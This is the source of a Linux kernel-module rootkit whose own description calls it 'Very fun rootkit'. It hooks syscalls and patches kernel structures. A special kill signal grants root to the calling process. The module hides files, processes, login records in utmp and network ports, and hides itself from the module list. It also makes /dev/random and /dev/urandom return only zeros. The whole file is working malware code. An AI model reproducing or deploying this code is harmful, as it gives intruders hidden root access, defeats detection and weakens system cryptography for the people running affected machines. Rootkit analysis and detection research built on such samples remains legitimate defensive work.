#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/threads.h>
#include <net/sock.h>
#include <net/tcp.h>
#include "hooking/utils.h"
#include "hooking/syscall.h"
#include "hooking/func.h"
#include "capabilities/privilege.h"
#include "capabilities/track.h"
#include "capabilities/hide.h"
#include "capabilities/unload.h"
#include "utils.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal numbers which can be used by the rootkit for its own purposes
enum rooti_signal {
    ROOTI_SIG_UNLOAD = 63,  // make the rootkit self destruct by unloading itself
    ROOTI_SIG_REG = 64      // request by a usermode process to be serviced by the rootkit
};

// Bitmap in which every bit represents the PID number of a registered client userspace process
static unsigned char rooti_clients_bitmap[PID_MAX_LIMIT / 8] = {0};

// List of /proc directory FDs opened by userspace processes
static LIST_HEAD(rooti_proc_tracked_fds);

// List of FDs of /var/run/utmp opened by userspace processes
static LIST_HEAD(rooti_utmp_tracked_fds);

struct list_head *rooti_tracked_fds_lists[] = {
    &rooti_proc_tracked_fds,
    &rooti_utmp_tracked_fds
};

// References to the original syscall handlers which we are hooking
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*orig_close)(const struct pt_regs *regs);
static asmlinkage long (*orig_dup)(const struct pt_regs *regs);
static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

// References to the original file operations which we are hooking
static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);

// References to the original seq operations which we are hooking
static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);

// Reference to other kernel functions that are hooked
static long (*orig_strncpy_from_user)(char *dst, const char __user *src, long count);


static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == ROOTI_SIG_REG) {
        // Register the new process
        rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
        return rooti_elevate_privilege();
    } 
    else if (sig == ROOTI_SIG_UNLOAD) {
        // Unload the rootkit
        rooti_self_destruct();
        return 0;
    }
    return orig_kill(regs);
}


static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    // Allocate a kernel buffer to store the requested filename + null terminator
    char *filepath_user = (char *)regs->si;
    char *filepath_kernel = kmalloc(PATH_MAX, GFP_KERNEL);
    if (filepath_kernel == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return orig_openat(regs);
    }

    // Copy the requested filename to the kernel mode buffer
    int len = strncpy_from_user(filepath_kernel, filepath_user, PATH_MAX - 1);
    if (len < 0) {
        ROOTI_DEBUG("strncpy_from_user() failed: %d", len);
        kfree(filepath_kernel);
        return orig_openat(regs);
    }
    filepath_kernel[PATH_MAX - 1] = '\0';

    // Invoke the original syscall
    int fd = orig_openat(regs);
    int err;
    
    // Check if the requested file to open is the /proc VFS directory
    if (strncmp(filepath_kernel, "/proc", PATH_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
    }
    // Check if the requested file to open is the utmp file storing login records
    else if (strncmp(filepath_kernel, "/var/run/utmp", PATH_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
    }

    kfree(filepath_kernel);
    return fd;
}

static asmlinkage long hook_close(const struct pt_regs *regs)
{
    int fd = regs->di;
    struct rooti_tracked_fd *record;

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // Search for a tracking of this FD and if found, remove it
        record = rooti_search_tracked_fd(fd, rooti_tracked_fds_lists[i]);
        if (record != NULL) {
            rooti_untrack_fd(record);
        }
    }
    return orig_close(regs);
}

static asmlinkage long hook_dup(const struct pt_regs *regs)
{
    int oldfd = regs->di;
    int newfd = orig_dup(regs);

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // If the old descriptor is tracked, the new one should also be tracked
        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
        }
    }
    return newfd;
}

static asmlinkage long hook_dup2(const struct pt_regs *regs)
{
    int oldfd = regs->di;
    int newfd = orig_dup2(regs);

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // If the old descriptor is tracked, the new one should also be tracked
        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
        }
    }
    return newfd;
}

static asmlinkage long hook_dup3(const struct pt_regs *regs)
{
    int oldfd = regs->di;
    int newfd = orig_dup3(regs);

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // If the old descriptor is tracked, the new one should also be tracked
        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
        }
    }
    return newfd;
}

static asmlinkage long hook_pread64(const struct pt_regs *regs) {
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;
    
    // Invoke the original syscall
    size_t nread = orig_pread64(regs);

    // Is this a read of /var/utmp?
    if (rooti_is_tracked_fd(fd, &rooti_utmp_tracked_fds)) {
        rooti_hide_login_entry(user_buf, count);
    }
    return nread;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    // Invoke the original syscall
    int fd  = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    int nread = orig_getdents64(regs);
    if (nread < 0) {
        return nread;
    }

    // Check if the directory FD is of /proc
    bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);

    // Filter any files we wish to hide from the buffer
    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num)) {
        return 0;
    }
    // Not the port to hide - call the original handler
    return orig_tcp4_seq_show(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num)) {
        return 0;
    }

    // Not the port to hide - call the original handler
    return orig_udp4_seq_show(seq, v);
}

static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
    size_t len = iov_iter_count(iter);
    char *kernel_buf = kzalloc(len, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    // Copy the rigged buffer back into userspace
    int err = copy_to_iter(kernel_buf, len, iter);
    if (!err) {
        ROOTI_DEBUG("copy_to_iter() failed: %d", err);
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return len;
}

/*
    This hook allows passing kernel space addresses to strncpy_from_user().
    The reason this is needed is so we can call system call service routines directly from within
    the kernel itself and avoid a panic whenever we pass a pointer to a kernel buffer to the service routine.
    Hooks for copy_to_user() and copy_from_user() are currently not needed but may be in the future.
*/
static long hook_strncpy_from_user(char *dst, const char __user *src, long count)
{
    ROOTI_DEBUG("strncpy_from_user called - addr is %lx", (unsigned long)src);
    return orig_strncpy_from_user(dst, src, count);
}

// List of system calls to hook :D
struct rooti_func_hook func_hooks[] = {
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup"), hook_dup, &orig_dup),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
};

struct rooti_func_hook test_hook = ROOTI_FUNC_HOOK("strncpy_from_user", hook_strncpy_from_user, &orig_strncpy_from_user);

/* LKM initialization */
static int __init rooti_init(void)
{
    ROOTI_DEBUG("init");

    // Resolves the address of kallsyms_lookup_name for later use
    int ret = rooti_resolve_kln_addr();
    if (ret < 0) {
        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", ret);
        return ret;
    }

    // Install function hooks :D
    ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    if (ret < 0) {
        ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
        return ret;
    }

    test_hook.addr = __kallsyms_lookup_name(test_hook.name);
    rooti_install_inline_hook(&test_hook);

    // Patch some operation structures function pointers. You could just hook the callbacks
    // themselves but I wanted to try patching kernel objects directly in memory.
    struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
    struct file_operations *urandom_file_ops = (struct file_operations *)__kallsyms_lookup_name("urandom_fops");
    struct seq_operations *tcp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
    struct seq_operations *udp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");

    // Disable write protection
    rooti_unprotect_memory();
    
    orig_random_read_iter = random_file_ops->read_iter;
    random_file_ops->read_iter = hook_random_read_iter;

    orig_urandom_read_iter = urandom_file_ops->read_iter;
    urandom_file_ops->read_iter = hook_random_read_iter;

    orig_tcp4_seq_show = tcp_seq_ops->show;
    tcp_seq_ops->show = hook_tcp4_seq_show;

    orig_udp4_seq_show = udp_seq_ops->show;
    udp_seq_ops->show = hook_udp4_seq_show;

    // Re-enable write protection
    rooti_protect_memory();

    // If configured to be hidden by default, hide this rootkit
#ifndef ROOTI_DEBUG_SHOWME
    ret = rooti_hideme();
    if (ret < 0)
        return ret;
#endif

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    ROOTI_DEBUG("exit");

    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));

    rooti_uninstall_inline_hook(&test_hook);

    // Restore kernel structures to their original form
    struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
    struct file_operations *urandom_file_ops = (struct file_operations *)__kallsyms_lookup_name("urandom_fops");
    struct seq_operations *tcp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
    struct seq_operations *udp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");

    // Disable write protection
    rooti_unprotect_memory();

    random_file_ops->read_iter = orig_random_read_iter;
    urandom_file_ops->read_iter = orig_urandom_read_iter;
    tcp_seq_ops->show = orig_tcp4_seq_show;
    udp_seq_ops->show = orig_udp4_seq_show;

    // Re-enable write protection
    rooti_protect_memory();

    // Release any remaining records
    struct rooti_tracked_fd *record;
    struct rooti_tracked_fd *tmp;
    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
            rooti_untrack_fd(record);
        }
    }
}

module_init(rooti_init);
module_exit(rooti_exit);
